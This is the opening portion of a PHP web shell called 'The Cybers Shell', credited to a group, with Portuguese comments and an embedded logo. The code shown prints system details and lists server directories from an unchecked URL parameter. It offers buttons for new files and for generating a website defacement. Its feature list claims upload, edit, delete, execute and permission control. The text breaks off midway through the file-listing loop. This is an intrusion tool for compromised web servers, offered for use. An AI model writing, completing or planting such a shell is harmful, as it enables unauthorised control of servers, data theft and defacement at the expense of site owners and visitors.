<!DOCTYPE html>
<html>
<head>
	<title>The Cybers Shell [beta 0.8]</title>
	<meta charset="utf-8">

	<style>
		table{
			width:100%;
		}
		tr{
			background-color:red;
		}
		body, h1 a{
			background-color:black;
			color:#05ff05;
			text-decoration: none;
		}
		th,td{
			background-color:#111;
			text-align: left;
			width:200px;
		}
		form{
			background-color:#111;
			width:100%;
			padding:5px;
			margin-top:10px;
			margin-bottom:10px;
		}
		a{
			color:red;
		}
		.logo{
			margin:0 auto;
			width:950px;
			height:100px;
			background-image: url('data:image/png;base64,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');
		}
	</style>
</head>
<body>
<small>[Beta 0.8] www.fb.com/TheCybersTeam</small>
<br />
<small><?php echo php_uname();?></small>
<div class="logo"></div>
<h1><a href="shell.php" title='Home'>The Cybers Shell</a></h1>

<?php

/*
	By: The Cybers Team
	Versão: Beta 0.8
	[ok] listar
	[no] visualizar
	[ok] download
	[ok] editar
	[ok] deletar
	[ok] upload
	[ok] navegar
	[ok] executar
	[ok] renomear
	[ok] criar
	[no] hint bar
	[ok] novo arquivo
	[ok] permissoes
*/
	// Configuração ==================================================
	if(!$diretorio = $_GET['ls']){
		$diretorio = getcwd();
	}

	// Funções =======================================================

	function permissao($arquivo){
		$perms = fileperms($arquivo);
		if(($perms&0xC000)==0xC000)$info='s';
		elseif(($perms&0xA000)==0xA000)$info='l';
		elseif(($perms&0x8000)==0x8000)$info='-';
		elseif(($perms&0x6000)==0x6000)$info='b';
		elseif(($perms&0x4000)==0x4000)$info='d';
		elseif(($perms&0x2000)==0x2000)$info='c';
		elseif(($perms&0x1000)==0x1000)$info='p';
		else $info='u';
		$info.=($perms&0x0100)?'r':'-';
		$info.=($perms&0x0080)?'w':'-';
		$info.=($perms&0x0040)?(($perms&0x0800)?'s':'x'):(($perms&0x0800)?'S':'-');
		$info.=($perms&0x0020)?'r':'-';
		$info.=($perms&0x0010)?'w':'-';
		$info.=($perms&0x0008)?(($perms&0x0400)?'s':'x'):(($perms&0x0400)?'S':'-');
		$info.=($perms&0x0004)?'r':'-';
		$info.=($perms&0x0002)?'w':'-';
		$info.=($perms&0x0001)?(($perms&0x0200)?'t':'x'):(($perms&0x0200)?'T':'-');
		return $info;
	}
	function anterior($dir){
		$dir = explode("/",$dir);
		unset($dir[count($dir)-1]);
		if($dir[1] == ""){
			$dir[0] = "/";
		}
		return implode("/",$dir);
	}
	function listar($dir){
		$anterior = anterior($dir);
		echo "
			<form action='shell.php' method='GET'>
				<input type='hidden' name='novo' value='$dir'/>
				<input type=submit value='Novo arquivo'></input>
			</form>
			<form action='shell.php' method='GET'>
				<input type='hidden' name='deface' value='$dir'/>
				<input type=submit value='Gerar deface'></input>
			</form>
		";
		echo "
			<table>
				<tr>
					<th>Arquivo</th>
					<th>Permissão</th>
					<th>Tamanho</th>
					<th>Abrir</th>
					<th>Download</th>
					<th>Renomear</th>
					<th>Editar</th>
					<th>Excluir</th>
				</tr>
		";
		foreach(scandir($dir) as $nome){
			$file = "$dir/$nome";
			if($nome ==".."){
				echo "<tr>";
				echo "<td><a href=?ls=$anterior>..</a></td>";
				echo "<td></td>";
				echo "<td></td>";
				echo "<td></td>";
				echo "<td></td>";
				echo "<td></td>";
				echo "<td></td>";
				echo "<td></td>";
				echo "</tr>";	
			}
			if(!is_file($file) and $nome != ".." and $nome != "."){
				echo "<tr>";
				echo "<td><a href=?ls=$file>$nome</a></td>";
				echo "<td>".permissao("$dir/$nome")."</td>";
				echo "<td></td>";
				echo "<td></td>";
				echo "<td></td>";
				echo "<td></td>";
				echo "<td></td>";
				echo "<td></td>";
